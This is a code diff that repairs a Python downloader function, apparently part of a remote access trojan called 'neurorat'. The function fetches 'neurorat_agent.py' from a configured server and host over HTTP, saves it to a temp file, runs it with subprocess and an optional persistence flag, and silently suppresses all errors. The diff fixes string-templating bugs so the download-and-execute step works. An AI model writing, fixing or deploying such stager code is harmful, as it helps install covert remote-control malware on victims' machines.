@@ -280,9 +280,9 @@ import urllib.request as request
 def dl():
     try:
         # Download agent code
-        server = "{server_host}"
-        port = {server_port}
-        u = f"http://{{server}}:{{port+2000}}/dl/neurorat_agent.py"
+        server = server_host
+        port = server_port
+        u = f"http://{server}:{port}/dl/neurorat_agent.py"
         r = request.urlopen(u).read()
         
         # Save to temp file
@@ -291,7 +291,11 @@ def dl():
             f.write(r)
         
         # Run agent
-        subprocess.Popen([sys.executable, p, "--server", "{server_host}", "--port", "{server_port}"{"", "--persistence"' if with_persistence else ''}])
+        args_list = [sys.executable, p, "--server", server, "--port", str(port)]
+        if with_persistence:
+            args_list.append("--persistence")
+        subprocess.Popen(args_list)
+
     except Exception as e:
         pass
 
